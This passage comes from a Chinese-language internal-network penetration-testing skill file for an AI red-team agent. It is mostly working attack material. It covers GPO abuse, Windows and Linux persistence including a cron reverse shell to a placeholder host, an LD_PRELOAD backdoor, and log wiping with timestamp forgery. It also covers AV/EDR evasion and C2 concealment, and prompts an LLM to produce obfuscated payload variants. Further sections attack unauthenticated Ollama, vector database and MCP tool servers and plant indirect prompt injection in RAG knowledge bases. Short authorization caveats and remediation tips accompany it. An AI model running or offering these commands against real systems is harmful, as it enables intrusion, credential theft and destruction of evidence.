SharpGPOAbuse.exe --AddLocalAdmin --UserAccount victim --GPOName "Default Domain Policy"
# 常见错误配置: gMSA密码、SPN账户、MachineAccountQuota(默认10,可机器账户→ESC)
```

### 8.5 域内后渗透与域管定位
```
# 域管定位(找域管登录过的主机)
psloggedon.exe \\10.10.10.10 /l
# BloodHound: Shortest Path to Domain Admins / 高价值目标(备份/管理主机)
# 获取域管hash后: 全域PTH/PTT清扫 → 逐台登录拿SYSTEM → 全域拿下
# 域管hash破解优先级: krbtgt(金票) > 域管组成员 > 服务账户
# 域内敏感信息: SYSVOL脚本、共享文件、邮件、备份文件(常含明文密码)
# AI辅助: 汇总所有收集结果 → LLM生成"域管接管最短路径"作战方案
```

## 九、权限维持

### 9.1 Windows持久化
```
# 用户态: 注册表Run键 / 计划任务 / 启动文件夹 / WMI事件订阅 / DLL劫持
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /d "C:\backdoor.exe" /f
schtasks /create /tn backdoor /tr C:\backdoor.exe /sc onlogon /ru SYSTEM /f
# 服务持久化(删除普通用户访问权限)
sc create backdoor binPath= C:\backdoor.exe start= auto
# 系统态: 服务/驱动(以SYSTEM权限,隐蔽)
# 域持久化: 黄金票据 / 域管账户克隆(ACL DCSync) / Skeleton Key / SSP
# 工具: SharpPersist / PoshC2持久化模块 / 内存马(Web场景)
```

### 9.2 Linux持久化
```
# SSH后门: 公钥写入 / 修改authorized_keys / PAM后门
cat ~/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys
# 计划任务/Cron反弹
(crontab -l; echo "*/5 * * * * bash -i >& /dev/tcp/<vps>/4444 0>&1") | crontab -
# 系统服务/init.d / 隐藏进程(进程名伪装成常见服务)
# 内核级: rootkit(LKM)/LD_PRELOAD后门
echo 'export LD_PRELOAD=/tmp/evil.so' > /etc/ld.so.preload
```

### 9.3 持久化对抗（蓝队视角自检）
```
- 持久化优先级: 域级(金票/ACL) > 系统级(服务/驱动) > 用户级(计划任务)
- 隐蔽性: 注册表Run易被发现 → 用WMI事件/服务DLL/内存马
- 清理风险: 先确认清理影响面,避免留下"删一半"痕迹
- AI辅助: 让LLM评估持久化方案的检测暴露面(ETW/事件ID/Sysmon规则)
```

## 十、痕迹清除

### 10.1 Windows日志
```
wevtutil el > list.txt                                    # 日志类别列表
wevtutil cl "windows powershell"                          # 清除指定类别
wevtutil cl "security" ; wevtutil cl "system" ; wevtutil cl "application"
# 精确删除(仅删自己相关事件,更隐蔽): Eventlogedit-evtx--Evolution / EventCleaner
# 破坏日志记录功能(非删除,规避取证): Invoke-Phant0m(杀EventLog线程)
# 3389登录记录清除
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f
# 文件访问时间伪造
# PowerShell执行历史/AMSI: 清理PSReadLine历史
```

### 10.2 Linux痕迹
```bash
unset HISTFILE; export HISTFILE=/dev/null                 # 关闭历史
history -c
# 登录记录清除(utmp/wtmp/lastlog)
utmpdump /var/run/utmp | grep -v <攻击IP> | utmpdump -r > /tmp/utmp && mv /tmp/utmp /var/run/utmp
utmpdump /var/log/wtmp | grep -v <攻击IP> | utmpdump -r > /tmp/wtmp && touch -r /var/log/wtmp /tmp/wtmp && mv /tmp/wtmp /var/log/wtmp
# 日志文件选择性删除: grep -v 自己的IP 后覆盖写回
sed -i '/<攻击IP>/d' /var/log/auth.log /var/log/secure 2>/dev/null
# webshell/后门文件时间戳伪造
touch -r /etc/passwd /tmp/backdoor.sh
```

### 10.3 清除原则（攻防对抗）
```
- 主控/日志服务器日志无法本地清除 → 先确认日志是否实时外传
- 横向痕迹: 目标主机上执行的命令/服务创建记录
- 内存痕迹: 进程注入后退出即消失,优先内存型后门
- AI辅助: 让LLM根据操作记录生成"证据链最小化"清理清单(哪些日志类别、哪些事件ID)
- 合规红线: 渗透测试中痕迹清除须经客户授权,报告应保留操作记录
```

## 十一、免杀与C2

### 11.1 免杀思路（攻防对抗核心）
```
# 检测维度: 静态特征/行为特征/内存特征/流量特征
# 免杀分层:
# 1) 源码层: 加密/混淆payload、变量重命名、字符串拆分、控制流平坦化
# 2) 加载层: Shellcode Loader(无文件)、进程注入(远程线程/APC/QueueUserAPC)、
#            模块隐藏、无新内存页特征
# 3) 传输层: HTTPS/HTTP2/WS加密流量、域前置、CDN中转、流量伪装(JA3指纹)
# 4) 执行层: 白利用(LOLBins: mshta/rundll32/regsvr32/certutil)、
#            签名程序加载、DLL劫持(白名单DLL)、内存DLL(Reflective)
# 常用技术: 分离免杀(C2远程加载)/ 加密shellcode(AES/XOR) / 沙箱对抗(延时/交互检测) /
#           AMSI/ETW Patch / Syscall直接调用(绕过EDR hook)
# 工具: shellcode loader模板 / Nim/Go/Rust加载器 / ScareCrow(签名+LOLBin)
```

### 11.2 C2基础设施
```
# Cobalt Strike / Sliver / Havoc / Metasploit / 商业化(MSFvenom+handler)
# 配置要点:
# - 仅使用HTTPS listener(HTTP明文易检测)
# - Malleable C2 Profile: 修改流量指纹(UA/JA3/请求路径/响应包)
# - 域前置/云函数/CDN: 隐藏真实C2地址
# - 证书伪装: 使用与目标业务相近的TLS证书
# - 多级C2: 边界listener → 内网redirector → 真实C2(内网不出网场景)
# - 反沙箱: 检测VM/沙箱环境延时执行
# 内网不出网: 通过已建立的隧道走C2流量(见第四章)
```

### 11.3 AI辅助免杀（大模型赋能攻防）
```
# 1) 代码生成: 让LLM生成多种语言的shellcode加载器变体
#    (C/C#/Go/Rust/Nim/Python,含XOR/AES加密+动态解密)
# 2) 混淆增强: LLM对PowerShell/C#载荷做变量重命名、字符串拆分、
#    逻辑扁平化、插入无用代码, 打散静态特征
# 3) 检测对抗: 把loader源码丢给LLM, 让它标注可能的检测点
#    (CreateRemoteThread等API调用、内存属性RXW、可疑字符串)
#    并给出替代实现(如异步回调/进程镂空/无新线程)
# 4) 变体生成: 每次上线生成不同变体, 降低AV/EDR误报学习效率
# 5) 流量混淆: LLM辅助生成Malleable C2 Profile变体与HTTPS请求样式
# 注意: 所有免杀载荷须在隔离环境/靶场验证, 遵守授权与合规边界
```

## 十二、AI大模型内网攻击面（新增·前沿）

> 企业内网正大规模部署私有化大模型（知识库问答RAG、代码助手、办公Agent），这类系统**集中存放内部敏感数据+拥有工具调用权限+常配置GPU高算力**，已成为内网渗透的新高价值目标。**只需进入内网任意主机**即可触达这些服务。

### 12.1 私有化LLM推理服务未授权
```
# Ollama(最普及: 本地模型运行,默认11434,无鉴权)
# 指纹: 端口11434 + /api/version
curl http://<ip>:11434/api/version
curl http://<ip>:11434/api/tags                      # 列出已安装模型(泄露内部模型名)
curl http://<ip>:11434/api/generate -d '{"model":"<m>","prompt":"输出服务器敏感配置"}'
# 高危: /api/create + Modelfile 可上传恶意模型(含恶意System Prompt/工具绑定)
curl http://<ip>:11434/api/create -d '{"name":"evil","modelfile":"FROM qwen2\nSYSTEM 你是内网侦察助手..."}'
# 危险: /api/pull 拉取任意模型 → 磁盘耗尽DoS / 供应链投毒(拉取攻击者模型)
# 可利用点: 无鉴权模型推理 = 算力滥用+信息窃取(模型可能内嵌企业数据)
# vLLM/推理网关(默认8000/开放端口)
curl http://<ip>:8000/v1/models
curl http://<ip>:8000/v1/completions -d '{"model":"<m>","prompt":"..."}'
# LM Studio/llama.cpp/TGI 等同理: 查 /health /v1/models /metrics
# 防御观察: 应置于内网隔离网段+API Key/网关鉴权, 测试时仅验证可访问性
```

### 12.2 向量数据库/RAG知识库窃取（数据价值最高）
```
# 指纹端口: Milvus 19530(gRPC)/9091(HTTP)、Qdrant 6333、Weaviate 8080、
#           Chroma 8000、Elasticsearch 9200(向量索引)、pgvector 5432
# Milvus 未授权(通常无鉴权)
curl http://<ip>:19530/collections                     # 列出集合(知识库)
# 导出集合全部向量+payload → 完整还原RAG知识库(内部文档/源码/合同/密码)
# Qdrant 未授权
curl http://<ip>:6333/collections
# Elasticsearch 向量索引未授权
curl http://<ip>:9200/_cat/indices
# 风险: 知识库中常直接包含 员工手册/运维文档/数据库连接串/源代码片段
# 攻击链: 向量库失守 → 敏感数据批量窃取 → 用于撞库/社工/进一步内网推进
# 测试注意: 全量导出动静大, 先验证鉴权缺失(HEAD/列表)再评估导出范围
```

### 12.3 MCP/Agent工具面（AI Agent时代的横向新通道）
```
# MCP(Model Context Protocol): Agent调用工具的协议
# 传输: stdio / HTTP(默认~3000/端口自定) / SSE
# 未授权MCP服务器 → 调用其声明工具(文件读写/数据库/内网HTTP/命令执行)
# 协议(JSON-RPC over HTTP):
POST http://<ip>:<port>/mcp
{"jsonrpc":"2.0","id":1,"method":"tools/list"}
# 拿到工具清单后逐个调用
{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"<tool>","arguments":{...}}}
# 典型危险工具: read_file / run_command / sql_query / http_request / browser
# 示例: 通过 read_file 读取 /etc/shadow 或 .aws/credentials
#      通过 http_request 访问内网169.254.169.254云元数据
# AI Agent平台(浏览器Agent/办公Agent): 诱导其执行操作 → 数据外泄/内网探测
# 测试注意: 调用工具可能产生真实副作用(写文件/发邮件/转账), 先确认工具权限边界
```

### 12.4 LLM平台后渗透（横向/维持）
```
# 低代码LLM平台弱口令(内网高发): Dify(5001)/FastGPT(3000)/Langflow(7860)/
#   MaxKB/AnythingLLM(3001)/One-API(3000) → 后台可管理全部知识库/模型/API Key
# 攻击面:
# 1) 管理后台 → 导出知识库/查看模型API Key/调用日志(泄露敏感prompt与数据)
# 2) API Key窃取 → 复用云上LLM服务(计费损失+数据泄露)
# 3) 提示注入: 在知识库/文档中预埋恶意prompt → 用户查询时诱导Agent执行
#    (检索增强中的"间接提示注入", 可用于横向/钓鱼/数据外泄)
# 4) 模型文件: GPU服务器/对象存储中的权重与微调数据(含业务知识,可投毒回投)
# 5) 容器化部署(K8s): 大模型平台常跑在K8s → 联动container-security-testing技能
# AI辅助对抗: 用LLM分析平台API文档自动发现未授权端点(见13.2)
```

## 十三、AI大模型辅助内网渗透（新增·前沿）

> AI大模型作为红队"副驾驶"，可显著提升信息分析、路径规划、工具生成与自动化作战效率。以下方法均面向**授权渗透测试**。

### 13.1 情报分析与决策辅助
```
# 1) 原始输出智能分析: 把 ipconfig/systeminfo/fscan/nmap/WinPEAS 输出粘贴给LLM
#    → 自动标注: 可利用CVE(补丁差)、高权限进程、可疑服务、攻击入口排序
#    → 输出"下一步动作建议"清单
# 2) 攻击路径规划: 把已收集的资产/凭证/权限汇总给LLM
#    → 生成"当前权限→域管"的路径图与执行顺序(类似BloodHound的LLM解释器)
# 3) BloodHound路径解释: 把cypher查询结果给LLM, 自动翻译攻击步骤
# 4) 凭证分析: 把抓取的密码/哈希批量给LLM → 分类(服务账户/域管/运维)、
#    推荐撞库目标与喷洒节奏
# 5) 报告自动生成: 按时间线整理操作 → LLM生成结构化渗透测试报告
# 提示词要点: 提供上下文(操作系统/权限/工具) → 要求给出可执行命令 → 要求说明风险
```

### 13.2 工具链增强（自动生成与改写）
```
# 1) 内网脚本自动生成: 用LLM编写一次性侦察/利用脚本
#    (如: 批量探测Ollama未授权、批量MSSQL弱口令检测、AD用户枚举脚本)
# 2) 载荷定制: 按目标环境(OS/杀软/框架)让LLM生成定制化PowerShell/C#载荷
# 3) 已知EXP复现辅助: 让LLM阅读漏洞公告/复现文章 → 输出可用参数与利用序列
# 4) API自动发现: 给LLM一个平台的后台JS/接口文档 → 生成未授权端点测试清单
#    (适用于LLM平台/物联网设备/新型SaaS)
# 5) 数据外带格式化: LLM把大规模扫描结果转成可导入BloodHound/Nuclei的格式
```

### 13.3 自动化作战（LLM+Agent编排）
```
# 概念: LLM Agent作为"指挥官", 编排既有工具链(nuclei/fscan/BloodHound/impacket)
# 1) 阶段式编排: 探测→扫描→验证→利用→凭证→横向, 每步由LLM根据上步结果决策
# 2) 智能打点: LLM聚合漏洞指纹 → 匹配最合适的EXP
# 3) 风险控制: LLM评估每个操作的噪音等级(是否触发EDR/日志外传) → 决策跳过
# 4) 审计追溯: 所有LLM决策记录可回放, 满足测试合规审计
# 落地形态: Eino/Agent框架(CyberStrikeAI)中的skill("intranet-penetration-testing")
#   与 sub-agent 协作: 侦察agent采集 → 分析agent决策 → 执行agent操作
# 注意: 自动化应"建议人执行", 高危操作(写文件/删日志/改权限)保留人工确认
```

### 13.4 防御对抗（检测规避评估）
```
# 用LLM模拟蓝队视角审查自己的操作:
# 1) 事件ID审计: 让LLM列出每步操作在Windows事件日志中的落点
#    (4624登录/4698计划任务创建/7036服务状态/4104 PS执行)
# 2) Sysmon/EDR规则映射: 评估载荷是否命中常见检测规则(可疑进程链/内存RXW)
# 3) 流量特征评估: 让LLM审查C2配置/隧道流量的检测面(JA3/UA/时序)
# 4) 生成缓解方案: 针对每个检测点给出替代手法
# 用途: 提升隐蔽性, 同时可用于防守方开展检测规则验证
```

## 十四、工具链

### 14.1 综合扫描
| 工具 | 用途 |
|------|------|
| fscan | 内网一体化扫描(存活/端口/弱口令/漏洞/Web) |
| LadonGo | 一键C/B/A段扫描+爆破+远程执行 |
| Netspy | 内网可达网段发现 |
| Yasso | 内网辅助工具集(含代理) |
| nmap/masscan | 端口与服务识别 |
| crackmapexec | 内网批量验证(协议矩阵) |

### 14.2 信息收集与凭证
| 工具 | 用途 |
|------|------|
| mimikatz | LSASS/ntds.dit/hash/票据 |
| SharpDecryptPwd | 常见软件密码批量解密 |
| HackBrowserData/SharpChromium | 浏览器凭据 |
| LaZagne | 多平台软件密码 |
| SharpCloud | 云凭证检查 |
| WinPEAS/PowerUp/les.sh | 提权自动枚举 |
| SharpHound/BloodHound | AD关系图与攻击路径 |

### 14.3 隧道与横向
| 工具 | 用途 |
|------|------|
| frp/Chisel/Neo-reGeorg/nps/pystinger | 隧道代理 |
| icmpsh/ptunnel/dnscat2/iodine | ICMP/DNS隧道 |
| impacket(psexec/wmiexec/smbexec/secretsdump) | 横向/凭证导出 |
| evil-winrm | WinRM横向 |
| Rubeus | Kerberos票据操作 |
| certipy | ADCS攻击 |
| noPac/zerologon/PrintSpoofer/GodPotato | 提权利用 |

### 14.4 AI/LLM相关
| 目标 | 检查工具/命令 |
|------|------|
| Ollama未授权 | `curl /api/tags` `/api/generate` |
| vLLM/推理网关 | `curl /v1/models` |
| 向量库未授权 | Milvus/Qdrant/Weaviate/Chroma API列表 |
| MCP服务器 | JSON-RPC `tools/list` |
| LLM平台后台 | Dify/FastGPT/Langflow弱口令 |

## 十五、内网渗透测试检查清单（高级版）

- [ ] 本地信息收集：网络/系统/软件/服务/用户/会话/补丁/防火墙/共享/路由/ARP
- [ ] 历史命令与登录记录（PowerShell历史/.bash_history/RDP/SSH外连记录）
- [ ] 杀软/EDR识别 → 免杀策略决策
- [ ] Windows凭证：mimikatz / Procdump / comsvcs / 注册表离线 / ntds.dit
- [ ] Linux凭证：mimipenguin / shadow / 环境变量 / 全盘grep
- [ ] 软件凭证：浏览器/Navicat/Xshell/向日葵/MSSQL/中间件配置
- [ ] 云凭证：AWS/Azure/云CLI/K8s SA Token
- [ ] 存活探测：Ping/NetBIOS/ARP/nmap/UDP
- [ ] 端口扫描+服务识别（含AI服务端口11434/向量库端口）
- [ ] 网段发现与多网段跳板规划
- [ ] 连通性判断（ICMP/TCP/HTTP/DNS出网）
- [ ] 隧道搭建（frp/Chisel/SSH/多级代理/ICMP/DNS隧道）
- [ ] Windows提权：BypassUAC/内核CVE/服务配置/Potato/MSI
- [ ] Linux提权：内核CVE/SUID/Cron/错误配置
- [ ] 横向：弱口令/未授权/中间件RCE/MS17-010/撞库
- [ ] 横向：IPC/PSEXEC/WMI/DCOM/SMBEXEC/WinRM/PTH
- [ ] Bypass AMSI
- [ ] 运维通道利用（补丁服务器/EDR/堡垒机）
- [ ] 虚拟化平台后渗透（vCenter/Zabbix/Exchange/K8s）
- [ ] 域信息收集 + BloodHound全量采集
- [ ] 域控获取：DCSync/Zerologon/noPac/Kerberoast/AS-REP/委派/GPP
- [ ] Kerberos攻击：金票/银票/PTT/委派滥用
- [ ] ADCS ESC1-8 / ACL滥用 / GPO滥用
- [ ] 域管定位与全域接管（PTH/PTT清扫）
- [ ] 权限维持（Win/Linux/域级三层）
- [ ] 痕迹清除（日志/历史/登录记录/时间戳）
- [ ] 免杀验证（源码/加载/传输/执行四层，隔离环境）
- [ ] C2配置（HTTPS/Malleable Profile/域前置/多级）
- [ ] AI服务未授权（Ollama/vLLM/向量库/MCP/LLM平台）
- [ ] AI辅助分析（扫描结果智能解析/攻击路径规划/报告生成）

## 十六、修复建议（高级）

- **凭证安全**：启用Credential Guard/LSA Protection、禁用WDigest明文、限制mimikatz可读LSASS、EDR实时监控LSASS访问
- **账号安全**：高权限账户（域管/本地管理员/sa）禁用交互登录与远程桌面、实施LAPS管理本地管理员密码、定期清理服务账户
- **域安全**：打齐域控补丁（Zerologon/noPac/PrintNightmare）、启用Kerberos票据保护、监控DCSync事件（4662/4769）、限制委派范围、ADCS审计（ESC漏洞）
- **网络隔离**：管理网段（运维/堡垒机/监控/补丁）与业务网段严格隔离、内网东西向流量监控、微分段
- **横向抑制**：关闭不必要的高危端口（139/445/3389外网+跨段限制）、SMB签名强制、禁用Guest
- **AI服务防护**：LLM推理服务（Ollama/vLLM）仅绑定内网管理网段+API Key鉴权、向量数据库认证与网络ACL、MCP/Agent最小权限+工具白名单、LLM平台强口令+SSO、对RAG知识库做敏感信息分级脱敏
- **监控告警**：异常登录（同源多目标/同目标多源）、计划任务/服务创建、AMSI绕过行为、LSASS访问、隧道特征流量、AI服务异常调用
- **日志与审计**：日志实时外传防本地清除、关键操作双人复核、渗透测试过程完整留痕
- **应急联动**：EDR/NDR/蜜罐联动，内网疑似横向立即隔离子网

## 注意事项

- **仅限授权测试**：内网渗透涉及真实业务系统与数据，必须在书面授权范围内进行，明确测试边界（网段/系统/时段）
- **数据敏感**：域控hash、数据库密码、知识库内容等敏感数据不得外泄、不得入库报告
- **高风险操作**：DCSync/金票/删除日志等操作影响面大且动静明显，先评估再执行
- **AI服务测试谨慎**：调用LLM推理/向量库导出会消耗资源与泄露数据，验证鉴权缺失后立即停止，不做全量导出
- **Agent/MCP工具调用风险**：触发工具可能产生真实副作用（写文件/转账/发邮件），先确认工具权限边界
- **免杀合规**：免杀载荷仅在授权靶场/隔离环境验证，禁止用于非授权目标
- **痕迹清除合规**：测试中清除痕迹须经客户同意，报告保留完整操作记录
- **合规要求**：遵守《网络安全法》《数据安全法》《个人信息保护法》及《网络数据安全管理条例》，仅在授权范围内测试

## DECISION TREE

```
已获内网立足点？
├── 本机收集 → 凭据窃取优先（lsass/注册表/服务配置/历史文件，第二章）→ 密码复用面
├── 网络发现 → 存活/端口/服务指纹 → 可达网段划分（第三章）
├── 出网受限 → 隧道选型按协议可用性（ICMP/DNS/HTTP，第四章）
├── 权限不足 → Windows（potato 系/UAC/内核）/ Linux（sudo/SUID/cap/内核）按枚举结果路由（五/六章）
├── 域环境确认 → 第八章 AD 渗透（Kerberoast/ASREP→DCSync→ADCS→委派，按凭据存量递进）
├── 凭据就绪 → 第七章横向矩阵（PTH/WMI/SMB/WinRM）按可达性与端口路由
└── 维持/免杀（九/十一章）→ 仅限授权范围内，先过 authorized-attack-scope 确认
```

## TARGET TOOL ADAPTATION

Use visible `execute-python-script` for 内网探测脚本与协议交互、`http-framework-test` for 内网 Web 服务面。不假设 impacket/CrackMapExec/Cobalt Strike 存在，等价能力以脚本内联实现；凭据使用严格限定授权资产。

## RELATED ROUTING

- [active-directory-attack](../active-directory-attack/SKILL.md) — 域渗透（Kerberoasting/DCSync/ADCS/委派）细分权威
- [post-exploitation](../post-exploitation/SKILL.md) — 提权/横向/维持的战术细分
- [unauthorized-access-common-services](../unauthorized-access-common-services/SKILL.md) — 内网常见服务未授权访问打点
